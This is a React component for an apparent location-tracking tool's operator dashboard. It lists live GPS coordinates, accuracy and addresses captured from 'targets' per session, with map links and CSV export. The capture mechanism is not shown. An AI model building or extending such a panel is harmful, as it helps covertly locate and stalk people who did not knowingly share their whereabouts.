import { useEffect, useState, useCallback } from 'react'
import { api, Location, Session } from '../api/client'
import { exportCSV } from '../utils/export'

export default function Locations() {
  const [locations, setLocations] = useState<Location[]>([])
  const [loading, setLoading] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [sessions, setSessions] = useState<Session[]>([])
  const [sessionFilter, setSessionFilter] = useState('')

  const refresh = useCallback(async () => {
    try {
      const data = await api.locations(0, 200, sessionFilter)
      setLocations(data)
    } catch (e) { console.error(e) }
    finally { setLoading(false) }
  }, [sessionFilter])

  useEffect(() => {
    api.sessions().then(setSessions).catch(() => {})
  }, [])

  useEffect(() => {
    refresh()
    if (autoRefresh) {
      const timer = setInterval(refresh, 15000)
      return () => clearInterval(timer)
    }
  }, [refresh, autoRefresh])

  const copy = (text: string) => {
    navigator.clipboard.writeText(text)
  }

  if (loading) return <div className="flex justify-center py-20"><div className="spinner"></div></div>

  return (
    <div className="space-y-4 stagger">
      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
        <div>
          <h1 className="text-xl font-bold text-primary">Locations</h1>
          <p className="text-sm text-tertiary mt-0.5">{locations.length} GPS coordinates captured</p>
        </div>
        <div className="flex gap-2">
          {locations.length > 0 && (
            <button onClick={() => exportCSV(locations.map(l => ({ session_id: l.session_id, latitude: l.latitude, longitude: l.longitude, accuracy: l.accuracy, address: l.address, date: new Date(l.created_at * 1000).toISOString() })), 'locations.csv')} className="select-apple cursor-pointer">📥 CSV</button>
          )}
          <select
            value={sessionFilter}
            onChange={e => setSessionFilter(e.target.value)}
            className="select-apple"
          >
            <option value="">All Sessions</option>
            {sessions.map(s => (
              <option key={s.id} value={s.id}>{s.name || s.id.substring(0, 16)}</option>
            ))}
          </select>
          <button onClick={() => setAutoRefresh(!autoRefresh)} className={`select-apple cursor-pointer ${autoRefresh ? 'accent-bg accent' : ''}`}>
            {autoRefresh ? '● Live' : 'Paused'}
          </button>
          <button onClick={refresh} className="select-apple cursor-pointer">⟳</button>
        </div>
      </div>

      {locations.length === 0 ? (
        <div className="empty-state animate-fade-in">
          <div className="icon">📍</div>
          <h3>No locations captured</h3>
          <p>GPS data appears when targets grant location access</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {locations.map((l, i) => {
            const acc = l.accuracy ?? 999
            const accLabel = acc < 10 ? 'High' : acc < 50 ? 'Medium' : 'Low'
            const accColor = acc < 10 ? '#34c759' : acc < 50 ? '#ff9f0a' : '#ff453a'
            return (
              <div key={l.id} className="stat-card animate-scale-in"
                style={{ animationDelay: `${i * 0.04}s`, animationFillMode: 'both' }}>
                <div className="flex items-start justify-between">
                  <div className="text-2xl select-none">📍</div>
                  <span className="badge" style={{ backgroundColor: `${accColor}15`, color: accColor }}>{accLabel}</span>
                </div>
                <div className="text-sm accent mono cursor-pointer mt-3 hover:underline" onClick={() => copy(`${l.latitude}, ${l.longitude}`)}>
                  {l.latitude.toFixed(6)}, {l.longitude.toFixed(6)}
                </div>
                {l.address && (
                  <div className="text-xs text-secondary mt-1 leading-relaxed line-clamp-2">{l.address}</div>
                )}
                <div className="text-xs mt-1" style={{ color: accColor }}>Accuracy: {acc}m</div>
                <div className="flex gap-2 mt-4">
                  <a href={l.maps_url} target="_blank" rel="noreferrer" className="flex-1 text-center text-xs accent-bg accent radius-card py-2 transition-colors hover:bg-accent">
                    🗺 Maps
                  </a>
                  <button onClick={() => copy(`${l.latitude}, ${l.longitude}`)} className="flex-1 text-center text-xs bg-tertiary text-secondary radius-card py-2 transition-colors hover:text-primary">
                    📋 Copy
                  </button>
                </div>
                <div className="text-xs text-tertiary mt-3">{new Date(l.created_at * 1000).toLocaleString()}</div>
              </div>
            )
          })}
        </div>
      )}
    </div>
  )
}
